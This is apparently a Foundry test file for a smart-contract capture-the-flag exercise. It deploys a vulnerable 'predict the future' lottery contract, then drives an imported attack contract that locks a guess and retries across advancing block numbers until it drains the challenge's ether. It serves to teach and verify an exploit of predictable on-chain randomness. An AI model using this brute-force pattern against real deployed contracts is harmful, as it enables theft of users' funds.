// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {PredictTheFutureChallenge} from "../../src/lotteries/PredictTheFutureChallenge.sol";
import {AttackPredictTheFutureChallenge} from "../../src/lotteries/AttackPredictTheFutureChallenge.sol";

contract TestPredictTheFutureChallenge is Test {
    PredictTheFutureChallenge challenge;
    AttackPredictTheFutureChallenge attack;

    address deployer;
    address attacker;

    function setUp() external {
        deployer = address(1);
        attacker = address(2);

        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);

        vm.prank(deployer);

        challenge = new PredictTheFutureChallenge{value: 1 ether}();
    }

    function testAttack() external {
        vm.startPrank(attacker);
        attack = new AttackPredictTheFutureChallenge(address(challenge));

        // lock in any number from 0-9
        attack.lockNumber{value: 1 ether}(4);

        // increase block.number by 2 to pass first require statement in challenge.settle()
        vm.roll(block.number + 2);

        bool solved;

        // attack until challenge is completed, increase block.number on every fail
        while (!solved) {
            try attack.solveChallenge() {
                solved = true;
            } catch {
                vm.roll(block.number + 1);
            }
        }

        assertEq(attacker.balance, 2 ether);
        assert(challenge.isComplete());
    }
}
